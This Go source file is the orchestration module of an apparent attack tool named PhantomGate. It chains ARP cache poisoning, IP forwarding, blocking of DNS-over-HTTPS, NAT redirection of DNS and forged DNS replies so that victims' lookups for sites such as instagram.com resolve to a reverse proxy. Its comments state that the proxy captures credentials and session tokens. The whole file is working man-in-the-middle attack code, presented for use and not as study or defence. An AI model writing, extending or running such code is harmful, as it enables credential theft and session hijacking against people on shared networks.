package dns

import (
	"fmt"
	"log"
	"net"
)

// InterceptSuite orchestrates the full DNS interception pipeline:
//   1. ARP Poisoning  → become the man-in-the-middle on the LAN
//   2. IP Forwarding   → forward all non-DNS traffic normally
//   3. DNS Poisoning   → intercept DNS queries, forge responses for target domains
//   4. PhantomGate     → serve the proxied site when victims connect
//
// Attack flow:
//   Victim types "instagram.com" in browser
//       ↓
//   DNS query goes out (UDP 53)
//       ↓
//   ARP poison ensures the query passes through us
//       ↓
//   DNS Poisoner sniffs it, sees "instagram.com" → injects forged response
//       ↓
//   Victim's browser receives: instagram.com → PhantomGate's IP
//       ↓
//   Victim connects to PhantomGate (thinking it's instagram.com)
//       ↓
//   PhantomGate reverse-proxies the REAL instagram.com
//       ↓
//   Credentials + session tokens captured transparently
type InterceptSuite struct {
	arpPoisoner  *ARPPoisoner
	dnsPoisoner  *Poisoner
	gatewayIP    string
	iface        string
	redirectIP   string
	targets      []string
	dohBlocked   bool
	dnsRedirected bool
}

// InterceptConfig configures the full interception suite
type InterceptConfig struct {
	// Network interface (e.g., "eth0", "wlan0")
	Interface string
	// Gateway IP on the network
	GatewayIP string
	// PhantomGate's IP — where victims get redirected
	RedirectIP string
	// Domains to intercept
	TargetDomains []string
	// Specific victim IPs (empty = entire subnet)
	VictimIPs []string
	// ARP poison interval in seconds
	ARPInterval int
}

// NewInterceptSuite creates the full ARP + DNS poisoning suite
func NewInterceptSuite(cfg InterceptConfig) (*InterceptSuite, error) {
	// Validate redirect IP
	if net.ParseIP(cfg.RedirectIP) == nil {
		return nil, fmt.Errorf("invalid redirect IP: %s", cfg.RedirectIP)
	}

	// Create ARP poisoner
	arpCfg := ARPConfig{
		Interface:    cfg.Interface,
		GatewayIP:    cfg.GatewayIP,
		TargetIPs:    cfg.VictimIPs,
		IntervalSecs: cfg.ARPInterval,
	}
	arp, err := NewARPPoisoner(arpCfg)
	if err != nil {
		return nil, fmt.Errorf("ARP poisoner init failed: %w", err)
	}

	// Create DNS poisoner
	dnsCfg := PoisonerConfig{
		Interface:     cfg.Interface,
		RedirectIP:    cfg.RedirectIP,
		TargetDomains: cfg.TargetDomains,
		TTL:           600,
	}
	dnp, err := NewPoisoner(dnsCfg)
	if err != nil {
		return nil, fmt.Errorf("DNS poisoner init failed: %w", err)
	}

	return &InterceptSuite{
		arpPoisoner: arp,
		dnsPoisoner: dnp,
		gatewayIP:   cfg.GatewayIP,
		iface:       cfg.Interface,
		redirectIP:  cfg.RedirectIP,
		targets:     cfg.TargetDomains,
	}, nil
}

// Start launches the full interception chain
func (is *InterceptSuite) Start() error {
	log.Println("")
	log.Println("  ┌──────────────────────────────────────────────────┐")
	log.Println("  │       PHANTOMGATE DNS INTERCEPTION SUITE          │")
	log.Println("  └──────────────────────────────────────────────────┘")
	log.Println("")

	// Step 1: Enable IP forwarding so intercepted traffic can reach its destination
	log.Printf("[1/5] Enabling IP forwarding...")
	if err := EnableIPForwarding(); err != nil {
		return fmt.Errorf("failed to enable IP forwarding: %w", err)
	}
	log.Printf("      ✓ IP forwarding enabled")

	// Step 2: Start ARP poisoning
	log.Printf("[2/5] Starting ARP poisoner on %s...", is.iface)
	if err := is.arpPoisoner.Start(); err != nil {
		return fmt.Errorf("ARP poisoner failed: %w", err)
	}
	log.Printf("      ✓ ARP cache poisoning active (gateway: %s)", is.gatewayIP)

	// Step 3: Block DNS-over-HTTPS so browsers fall back to regular DNS
	log.Printf("[3/5] Blocking DNS-over-HTTPS (DoH/DoT/QUIC)...")
	if err := BlockDoH(); err != nil {
		log.Printf("      ! DoH blocking partially failed: %v", err)
	} else {
		is.dohBlocked = true
		log.Printf("      ✓ DoH/DoT/QUIC blocked — browsers forced to use regular DNS")
	}

	// Step 4: Redirect ALL victim DNS traffic (port 53) to us via NAT
	// This catches victims who use 8.8.8.8, 1.1.1.1, or any custom DNS server
	log.Printf("[4/5] Redirecting all victim DNS traffic to PhantomGate...")
	if err := redirectDNS(is.redirectIP); err != nil {
		log.Printf("      ! DNS redirect partially failed: %v", err)
	} else {
		is.dnsRedirected = true
		log.Printf("      ✓ All DNS (port 53) from victims now redirected to %s", is.redirectIP)
	}

	// Step 5: Start DNS poisoning (inline, on the wire)
	log.Printf("[5/5] Starting DNS poisoner...")
	if err := is.dnsPoisoner.Start(); err != nil {
		is.arpPoisoner.Stop()
		if is.dohBlocked {
			UnblockDoH()
		}
		return fmt.Errorf("DNS poisoner failed: %w", err)
	}
	log.Printf("      ✓ DNS poisoning active → %s", is.redirectIP)

	log.Println("")
	log.Println("  ⚡ Interception pipeline is LIVE")
	log.Println("  Victims' DNS queries will be poisoned in real-time.")
	log.Println("  All target domains now resolve to PhantomGate.")
	log.Println("")
	log.Println("  Target domains:")
	for _, d := range is.targets {
		log.Printf("    ☠️  %s → %s", d, is.redirectIP)
	}
	log.Println("")

	return nil
}

// Stop gracefully shuts down all interception and restores network state
func (is *InterceptSuite) Stop() {
	log.Println("\n  [!] Shutting down interception suite...")

	log.Printf("  [1/5] Stopping DNS poisoner...")
	is.dnsPoisoner.Stop()

	log.Printf("  [2/5] Removing DNS redirect rules...")
	if is.dnsRedirected {
		unredirectDNS(is.redirectIP)
	}

	log.Printf("  [3/5] Restoring DoH access...")
	if is.dohBlocked {
		UnblockDoH()
	}

	log.Printf("  [4/5] Stopping ARP poisoner (restoring caches)...")
	is.arpPoisoner.Stop()

	log.Printf("  [5/5] Disabling IP forwarding...")
	DisableIPForwarding()

	log.Println("  [+] Network state fully restored. Interception suite stopped.")
}

// AddTarget adds a domain to intercept at runtime
func (is *InterceptSuite) AddTarget(domain string) {
	is.dnsPoisoner.AddTarget(domain)
}

// RemoveTarget removes a domain from interception
func (is *InterceptSuite) RemoveTarget(domain string) {
	is.dnsPoisoner.RemoveTarget(domain)
}

// GetDNSStats returns DNS poisoning statistics
func (is *InterceptSuite) GetDNSStats() PoisonStats {
	return is.dnsPoisoner.GetStats()
}
